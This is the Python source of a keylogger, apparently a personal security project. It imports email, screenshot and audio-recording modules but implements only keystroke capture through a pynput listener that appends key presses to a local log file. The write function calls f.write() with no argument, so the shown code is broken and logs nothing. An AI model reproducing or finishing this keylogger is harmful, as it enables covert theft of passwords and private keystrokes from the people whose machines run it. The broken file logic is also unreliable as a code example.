##########################
# import modules | packages | libraries
###########################

# email package to read, write, and send simple email 
# messages, as well as more complex MIME messages
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib # import smtplib for the actual sending function

from requests import get # allows HTTP requests 
import socket # binds localhost on a port listens for connections

import cryptography.fernet # encrypted messages cannot be manipulated without key
import getpass # accept passwords where data needs to be secure

from pynput.keyboard import Key, Listener # "Key" logs key, "Listener" listens for keystroke
import sounddevice as sd # binds PortAudio library | play and record NumPy arrays 
from scipy.io.wavfile import write # allows write to uncompressed WAV file

from multiprocessing import Process, freeze_support # when multiprocessing has been frozen produce Windows executable

from PIL import ImageGrab # used to copy contents of screen - clipboard to a PIL image memory

# retrieves info about sys platform, current time+ and interacts with the native OS
import platform 
import time
import os

##########################
# keylogger logic
##########################

# define logger save to path
keys_information = "key_log.txt" 
file_path = "/Users/amartin/Desktop/cyber_Projects/keylogger/key_log.txt"

cont = 0
keys = []

def on_press(key):
    global keys, cont
    keys.append(key)
    
    cont += 1
    if cont >= 1:
        cont = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path, "a") as f:
        f.write()
        f.close()

with Listener(on_press=on_press) as listener:
    listener.join()

##########################
#
##########################